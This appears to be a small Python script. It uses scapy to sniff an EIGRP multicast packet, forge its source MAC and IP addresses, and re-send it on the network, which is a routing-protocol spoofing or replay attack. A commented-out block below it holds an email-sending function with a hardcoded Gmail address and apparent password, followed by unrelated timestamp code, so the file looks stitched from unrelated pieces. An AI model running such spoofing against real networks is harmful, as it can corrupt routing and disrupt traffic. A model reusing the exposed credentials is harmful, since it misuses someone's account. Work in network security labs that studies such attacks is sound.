from scapy.all import *
load_contrib('eigrp')
pkt = sniff(filter="ip dst 224.0.0.10",count=1)
pkt[0].src="00:00:00:11:11:11"
pkt[0][IP].src="192.168.122.123"
pkt[0][IP].chksum=None
sendp(pkt[0], loop=0, verbose=1)


"""import smtplib
def send(message):
    server = smtplib.SMTP_SSL("smtp.gmail.com",465)
    server.login("thomaspradhan915@gmail.com","Elon-musk")
    server.sendmail("thomaspradhan915@gmail.com","ashimpradhan30@gmail.com",message)
    server.quit()
import time
seconds = time.time()
print("Seconds since epoch =", seconds)
"""

